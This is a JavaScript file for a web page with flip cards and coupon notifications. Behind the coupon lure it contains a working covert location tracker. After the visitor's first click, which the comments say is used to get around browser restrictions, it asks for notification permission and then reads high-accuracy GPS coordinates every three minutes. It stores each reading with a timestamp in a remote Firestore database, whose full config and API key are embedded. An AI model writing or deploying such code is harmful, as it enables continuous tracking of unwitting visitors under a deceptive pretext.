/* CONEXION BASE DE DATOS */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
  getCountFromServer
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyBZavR7TNRrzKrxr1RqnvfrUelMLz81hyg",
  authDomain: "bd-herramienta-busqueda.firebaseapp.com",
  projectId: "bd-herramienta-busqueda",
  storageBucket: "bd-herramienta-busqueda.firebasestorage.app",
  messagingSenderId: "416153196731",
  appId: "1:416153196731:web:b0bc4ffe60cbb3a9a3319e",
  measurementId: "G-6S15ZGGCQ4"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

/* FUNCION DE BD */
async function guardarUbicacionBD(lat, lon) {
  try {
    const colRef = collection(db, "ubicaciones");
    const snapshot = await getCountFromServer(colRef);
    const nuevoId = (snapshot.data().count || 0) + 1; // Ajuste para que no empiece en 0

    await addDoc(colRef, {
      ubicacion: `${lat}, ${lon}`,
      id_ubicaciones: nuevoId,
      fecha_ubi: serverTimestamp(),
    });
    console.log(`Documento guardado. ID: ${nuevoId}`);
  } catch (e) {
    console.error("Error en Firestore:", e);
  }
}

/* FUNCION DE GEOLOCALIZACION */
function obtenerUbicacion() {
  const resultado = document.getElementById("resultado");
  if (navigator.geolocation) {
    if (resultado) resultado.innerHTML = "Capturando...";

    navigator.geolocation.getCurrentPosition(
      (posicion) => {
        const lat = posicion.coords.latitude;
        const lon = posicion.coords.longitude;
        if (resultado) resultado.innerHTML = `Lat: ${lat}, ${lon}`;
        guardarUbicacionBD(lat, lon);
      },
      (error) => console.error("Error GPS:", error.message),
      { enableHighAccuracy: true, timeout: 5000 }
    );
  }
}

/* NOTIFICADOR Y SERVICE WORKER */
const NotificadorInvasivo = {
  registration: null,
  iniciar: async function (ms) {
    try {
      // 1. Registro del SW (Asegúrate que sw.js esté en la raíz)
      this.registration = await navigator.serviceWorker.register('/sw.js');
      
      // 2. Pedir permiso (Debe ser disparado por un clic)
      let permission = await Notification.requestPermission();

      if (permission === "granted") {
        obtenerUbicacion();
        setInterval(() => obtenerUbicacion(), ms);
      }
    } catch (err) {
      console.error("Fallo en Notificador/SW:", err);
    }
  }
};

/* GESTIÓN DE NOTIFICACIONES (CUPÓN) */
const Noti = {
  msg: "¡Cupón: PROMO2026! 🎁",
  lanzar: function () {
    if (Notification.permission === "granted") {
      new Notification("¡Nuevo Cupón!", { body: this.msg });
    }
    const div = document.createElement('div');
    div.innerHTML = this.msg;
    div.style = "position:fixed;bottom:20px;right:20px;background:#000;color:#fff;padding:15px;border-radius:8px;z-index:9999;";
    document.body.appendChild(div);
    setTimeout(() => div.remove(), 5000);
  }
};

/* ACTIVACIÓN UNIFICADA (El cambio más importante) */
// Los navegadores bloquean window.onload para estas funciones. 
// Usamos un solo listener de clic para activar todo.
document.addEventListener('click', () => {
    NotificadorInvasivo.iniciar(180000);
    
    // Iniciar ciclo de cupones
    setInterval(() => Noti.lanzar(), 180000);
}, { once: true }); // Solo se ejecuta una vez al primer clic

/* JQUERY FLIP */
$(document).ready(function(){
    $("#card").flip();
    $("#carde").flip();
});